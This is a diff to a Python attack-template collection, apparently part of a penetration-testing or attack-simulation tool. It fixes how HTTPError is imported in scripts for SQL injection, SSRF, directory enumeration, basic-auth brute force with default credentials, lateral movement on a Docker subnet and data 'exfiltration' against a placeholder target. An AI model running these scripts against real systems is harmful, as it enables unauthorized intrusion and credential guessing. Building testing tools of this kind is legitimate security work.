@@ -46,7 +46,7 @@ print(json.dumps({'target': target, 'open_ports': open_ports, 'total': len(open_
 """,
 
     '服务识别': """\
-import socket, json
+import socket, json, urllib.error
 try:
     import urllib.request as ur
 except ImportError:
@@ -80,7 +80,7 @@ print(json.dumps(info, ensure_ascii=False, indent=2))
 """,
 
     'SQL注入': """\
-import urllib.request as ur, urllib.parse, json, http.cookiejar
+import urllib.request as ur, urllib.parse, urllib.error, json, http.cookiejar
 target = '__TARGET__'
 port = __PORT__
 base = f'http://{target}:{port}'
@@ -110,7 +110,7 @@ for path in probe_paths:
                 results.append({'path': path, 'label': label, 'payload': payload,
                                 'status': r.status, 'sql_error_hint': sql_hint})
                 break  # 该路径成功响应，跳过剩余同路径 payload
-        except ur.error.HTTPError as e:
+        except urllib.error.HTTPError as e:
             results.append({'path': path, 'label': label, 'payload': payload,
                             'status': e.code, 'sql_error_hint': False})
             break
@@ -145,7 +145,7 @@ print(json.dumps({'attack': 'XSS', 'target': base, 'results': results}, ensure_a
 """,
 
     'SSRF攻击': """\
-import urllib.request as ur, urllib.parse, json
+import urllib.request as ur, urllib.parse, urllib.error, json
 target = '__TARGET__'
 port = __PORT__
 base = f'http://{target}:{port}/'
@@ -161,7 +161,7 @@ for probe in probes:
     try:
         with ur.urlopen(url, timeout=3) as r:
             results.append({'probe': probe, 'status': r.status, 'reachable': True})
-    except ur.error.HTTPError as e:
+    except urllib.error.HTTPError as e:
         results.append({'probe': probe, 'status': e.code})
     except Exception as e:
         results.append({'probe': probe, 'error': str(e)[:60]})
@@ -169,7 +169,7 @@ print(json.dumps({'attack': 'SSRF', 'target': base, 'results': results}, ensure_
 """,
 
     'Web目录枚举': """\
-import urllib.request as ur, json
+import urllib.request as ur, urllib.error, json
 target = '__TARGET__'
 port = __PORT__
 base = f'http://{target}:{port}'
@@ -180,7 +180,7 @@ for p in paths:
     try:
         with ur.urlopen(base + p, timeout=3) as r:
             found.append({'path': p, 'status': r.status, 'size': len(r.read(32))})
-    except ur.error.HTTPError as e:
+    except urllib.error.HTTPError as e:
         if e.code != 404:
             found.append({'path': p, 'status': e.code})
         else:
@@ -192,7 +192,7 @@ print(json.dumps({'attack': '目录枚举', 'base': base, 'found': found, '404_c
 """,
 
     '暴力破解': """\
-import urllib.request as ur, base64, json
+import urllib.request as ur, urllib.error, base64, json
 target = '__TARGET__'
 port = __PORT__
 creds = [('admin','admin'),('admin','123456'),('admin','password'),
@@ -204,7 +204,7 @@ for u, p in creds:
     try:
         with ur.urlopen(req, timeout=3) as r:
             results.append({'user': u, 'pass': p, 'status': r.status, 'success': r.status == 200})
-    except ur.error.HTTPError as e:
+    except urllib.error.HTTPError as e:
         results.append({'user': u, 'pass': p, 'status': e.code, 'success': False})
     except Exception as e:
         results.append({'user': u, 'pass': p, 'error': str(e)[:40]})
@@ -228,7 +228,7 @@ print(json.dumps({'attack': '横向移动', 'subnet': '172.17.0.0/24',
 """,
 
     '数据外传': """\
-import urllib.request as ur, json
+import urllib.request as ur, urllib.error, json
 target = '__TARGET__'
 port = __PORT__
 base = f'http://{target}:{port}'
@@ -239,7 +239,7 @@ for p in paths:
         with ur.urlopen(base + p, timeout=3) as r:
             size = len(r.read(1024))
             results.append({'path': p, 'status': r.status, 'bytes': size})
-    except ur.error.HTTPError as e:
+    except urllib.error.HTTPError as e:
         results.append({'path': p, 'status': e.code})
     except Exception:
         results.append({'path': p, 'status': 'timeout'})
